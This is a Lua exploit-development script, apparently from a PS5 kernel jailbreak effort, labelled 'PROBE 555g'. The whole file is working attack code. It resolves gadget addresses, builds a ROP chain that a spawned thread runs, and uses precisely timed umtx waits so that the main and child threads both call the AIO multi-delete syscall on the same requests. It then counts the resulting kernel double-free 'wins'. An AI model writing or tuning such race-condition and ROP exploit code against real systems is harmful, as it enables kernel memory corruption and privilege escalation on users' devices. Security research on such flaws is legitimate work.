-- CRASH_CLASS: HIGH
-- PROBE 555g: umtx-timed race for aio_multi_delete double-free
--
-- Key findings from 555e/555f:
--   - PS5 won't preempt main during Lua loops (tight spin = child starved)
--   - sched_yield gives up entire timeslice (~10ms) → child finishes before main
--   - Need PRECISE blocking with sub-ms timeout
--
-- Solution: _umtx_op(454) UMTX_OP_WAIT with sub-ms timeout.
-- Main blocks for N μs, child runs during that window, then both race delete.
--
-- We test 3 delay values: 50μs, 100μs, 200μs to find the sweet spot.

print("=== PROBE 555g: UMTX-TIMED RACE ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function zero(b, n) for off = 0, n - 4, 4 do wd(b + off, 0) end end
local function q(v)
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("0x%08X%08X", h, l)
    end
    return string.format("0x%X", N(v))
end

local Z = uint64(0)
local sc20  = mk(20)
local sc6   = mk(6)
local sc135 = mk(135)
local sc331 = mk(331)
local sc454 = mk(454)  -- _umtx_op
local sc455 = mk(455)
local sc477 = mk(477)
local sc669 = mk(669)
local sc662 = mk(662)
local sc664 = mk(664)
local sc666 = mk(666)

local pid = N(sc20())
print("pid=" .. pid)

local info = memory.alloc(0x200)
zero(info, 0x200); wd(info, 0x160)
pcall(function() mk(593)(Z, info) end)
local eb = uint64(string.format("0x%X%08X", rd(info + 0x10C) or 0, rd(info + 0x108) or 0))

zero(info, 0x200); wd(info, 0x160)
pcall(function() mk(593)(uint64(0x2001), info) end)
local lk = uint64(string.format("0x%X%08X", rd(info + 0x10C) or 0, rd(info + 0x108) or 0))
print("eb=" .. q(eb) .. " lk=" .. q(lk))

local pop_rax   = eb + uint64(0x992)
local pop_rdi   = eb + uint64(0xC9DFE)
local pop_rsi   = eb + uint64(0xD77D)
local pop_rdx   = eb + uint64(0x3B02D7)
local pop_rcx   = eb + uint64(0xE64)
local mov_m_rax = eb + uint64(0x92C67)
local bare_ret  = eb + uint64(0x42)
local fn_addr   = lk + uint64(0xB57)

local BATCH  = 32
local ROUNDS_PER = 100  -- per delay value

-- Shared memory
local ok_sh, shared = pcall(function()
    return sc477(Z, uint64(0x4000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), Z)
end)
print("shared=" .. q(shared))
local shared_n = N(shared)

local done_addr   = shared_n + 0x000
local ids_addr    = shared_n + 0x010
local child_errs  = shared_n + 0x200
local main_errs   = shared_n + 0x400
local umtx_addr   = shared_n + 0x800  -- umtx wait variable

-- Fake TCB
local ok_tcb, tcb_page = pcall(function()
    return sc477(Z, uint64(0x4000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), Z)
end)
for i = 0, 0x100, 8 do wq(tcb_page + i, tcb_page) end
local tcb_ptr_buf = memory.alloc(8)
wq(tcb_ptr_buf, tcb_page)

-- Child stack
local ok_stk, stack_base = pcall(function()
    return sc477(Z, uint64(0x200000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), Z)
end)
local rsp = N(stack_base) + 0x100000 - 8

-- Child chain: sysarch → delete → done → exit (NO delay — main provides the timing)
local function build_chain()
    local pos = 0
    local function emit(v) wq(uint64(rsp + pos), v); pos = pos + 8 end

    -- sysarch(165)
    emit(pop_rdi); emit(uint64(129))
    emit(pop_rsi); emit(uint64(N(tcb_ptr_buf)))
    emit(pop_rax); emit(uint64(165))
    emit(fn_addr)

    -- delete(662)
    emit(pop_rdi); emit(uint64(ids_addr))
    emit(pop_rsi); emit(uint64(BATCH))
    emit(pop_rdx); emit(uint64(child_errs))
    emit(pop_rax); emit(uint64(662))
    emit(fn_addr)

    -- done marker
    emit(pop_rax); emit(uint64(0xDEAD))
    emit(pop_rdi); emit(uint64(done_addr))
    emit(mov_m_rax)

    -- thr_exit
    emit(pop_rdi); emit(Z)
    emit(pop_rax); emit(uint64(431))
    emit(fn_addr)

    return pos
end

local chain_sz = build_chain()
print("chain=" .. chain_sz .. "B")

-- thr_param
local tp = memory.alloc(0x40); zero(tp, 0x40)
wq(tp, bare_ret)
wq(tp + 0x10, stack_base)
wq(tp + 0x18, uint64(0x100008))

-- umtx_time struct: {tv_sec(8), tv_nsec(8), _flags(4), _clockid(4)} = 24 bytes
local umtx_time = memory.alloc(32)

-- Reusable buffers
local sv      = memory.alloc(16)
local scratch = memory.alloc(0x1000)
local reqs    = memory.alloc(BATCH * 0x28 + 16)
local ids_tmp = memory.alloc(BATCH * 4 + 16)
local cst     = memory.alloc(BATCH * 4 + 16)
local poll_st = memory.alloc(BATCH * 4 + 16)

-- ============================================================
-- Test umtx_wait first
-- ============================================================
print("\n--- UMTX TIMING TEST ---")
wd(umtx_addr, 0)  -- value to match
wq(umtx_time, Z)                     -- tv_sec = 0
wq(umtx_time + 8, uint64(100000))    -- tv_nsec = 100 μs
wd(umtx_time + 16, 0)                -- flags = 0 (relative)
wd(umtx_time + 20, 4)                -- clockid = CLOCK_MONOTONIC

-- Measure: how many getpid calls fit in 100μs umtx wait?
local count_before = N(sc20())  -- warm up
local ok_u, rv_u = pcall(function()
    return sc454(uint64(umtx_addr), uint64(5), Z,
        uint64(N(umtx_time)), uint64(24))
end)
print(string.format("umtx_wait(100μs): rv=%s ok=%s",
    ok_u and tostring(N(rv_u)) or "crash", tostring(ok_u)))

-- Time it with getpid counter
wq(umtx_time + 8, uint64(1000000))  -- 1ms
wd(umtx_addr, 0)
local t0 = os.clock and os.clock() or 0
pcall(function()
    sc454(uint64(umtx_addr), uint64(5), Z,
        uint64(N(umtx_time)), uint64(24))
end)
local t1 = os.clock and os.clock() or 0
if t1 > t0 then
    print(string.format("umtx_wait(1ms): %.1fms", (t1 - t0) * 1000))
end

-- ============================================================
-- Race with different delays
-- ============================================================
local delays_ns = {50000, 100000, 500000, 1000000, 2000000}  -- 50μs, 100μs, 500μs, 1ms, 2ms

for _, delay_ns in ipairs(delays_ns) do
    local delay_label = delay_ns < 1000000
        and string.format("%dμs", delay_ns / 1000)
        or string.format("%dms", delay_ns / 1000000)

    print(string.format("\n--- DELAY %s (%d rounds) ---", delay_label, ROUNDS_PER))

    -- Set umtx timeout
    wq(umtx_time, Z)
    wq(umtx_time + 8, uint64(delay_ns))
    wd(umtx_time + 16, 0)
    wd(umtx_time + 20, 4)

    local wins = 0
    local mc = 0
    local cc = 0
    local mx = 0
    local timeouts = 0

    for round = 1, ROUNDS_PER do
        local fds_r = {}
        local fds_w = {}
        local ok_sp = true
        for i = 1, BATCH do
            local ok, v = pcall(function()
                return sc135(uint64(1), uint64(1), Z, uint64(N(sv)))
            end)
            if ok and N(v) >= 0 then
                fds_r[i] = rd(sv)
                fds_w[i] = rd(sv + 4)
            else
                ok_sp = false; break
            end
        end

        if ok_sp then
            -- Submit AIO
            for i = 0, BATCH - 1 do
                local base = reqs + i * 0x28
                wq(base + 0x00, Z)
                wq(base + 0x08, uint64(0x1000))
                wq(base + 0x10, uint64(N(scratch)))
                wq(base + 0x18, Z)
                wd(base + 0x20, fds_r[i + 1])
                wd(base + 0x24, 0)
            end
            for i = 0, BATCH - 1 do wd(ids_tmp + i * 4, 0) end
            pcall(function()
                sc669(uint64(0x1001), uint64(N(reqs)), uint64(BATCH),
                    uint64(3), uint64(N(ids_tmp)))
            end)

            -- Cancel + close peers
            pcall(function()
                sc666(uint64(N(ids_tmp)), uint64(BATCH), uint64(N(cst)))
            end)
            for i = 1, BATCH do
                pcall(function() sc6(uint64(fds_w[i])) end)
            end

            -- Poll terminal
            local all_term = false
            for try = 1, 100 do
                pcall(function()
                    sc664(uint64(N(ids_tmp)), uint64(BATCH), uint64(N(poll_st)))
                end)
                all_term = true
                for i = 0, BATCH - 1 do
                    local s = rd(poll_st + i * 4)
                    if not s or s < 3 then all_term = false; break end
                end
                if all_term then break end
            end

            if all_term then
                -- Setup shared mem
                for i = 0, BATCH - 1 do
                    wd(ids_addr + i * 4, rd(ids_tmp + i * 4) or 0)
                    wd(child_errs + i * 4, 0x77777777)
                    wd(main_errs + i * 4, 0x77777777)
                end
                wd(done_addr, 0)
                wd(umtx_addr, 0)  -- value to wait on

                -- Launch child (goes to sysarch → delete immediately)
                pcall(function()
                    sc455(uint64(N(tp)), uint64(0x38))
                end)

                -- Block for N μs via umtx_wait
                -- Child runs during this sleep
                pcall(function()
                    sc454(uint64(umtx_addr), uint64(5), Z,
                        uint64(N(umtx_time)), uint64(24))
                end)

                -- Main calls delete immediately after waking
                pcall(function()
                    sc662(uint64(ids_addr), uint64(BATCH), uint64(main_errs))
                end)

                -- Wait for child done
                for w = 1, 200 do
                    if (rd(done_addr) or 0) == 0xDEAD then break end
                    pcall(function() sc331() end)
                end
                if (rd(done_addr) or 0) ~= 0xDEAD then
                    timeouts = timeouts + 1
                end

                -- Analyze
                local win_count = 0
                local m_ok = 0
                local c_ok = 0
                for i = 0, BATCH - 1 do
                    local ce = rd(child_errs + i * 4) or 0x77777777
                    local me = rd(main_errs + i * 4) or 0x77777777
                    if ce == 0 and me == 0 then win_count = win_count + 1 end
                    if me == 0 then m_ok = m_ok + 1 end
                    if ce == 0 then c_ok = c_ok + 1 end
                end

                if win_count > 0 then
                    wins = wins + win_count
                    print(string.format("  R%d: *** DOUBLE-FREE %d slots ***",
                        round, win_count))
                end

                if m_ok == BATCH then mc = mc + 1
                elseif c_ok == BATCH then cc = cc + 1
                elseif m_ok > 0 and c_ok > 0 then mx = mx + 1
                end
            end

            -- Cleanup
            for i = 1, BATCH do
                pcall(function() sc6(uint64(fds_r[i])) end)
            end
        end
    end

    print(string.format("  %s: wins=%d main=%d child=%d mixed=%d to=%d",
        delay_label, wins, mc, cc, mx, timeouts))
end

print("\npid_final=" .. N(sc20()))
print("=== 555g DONE ===")
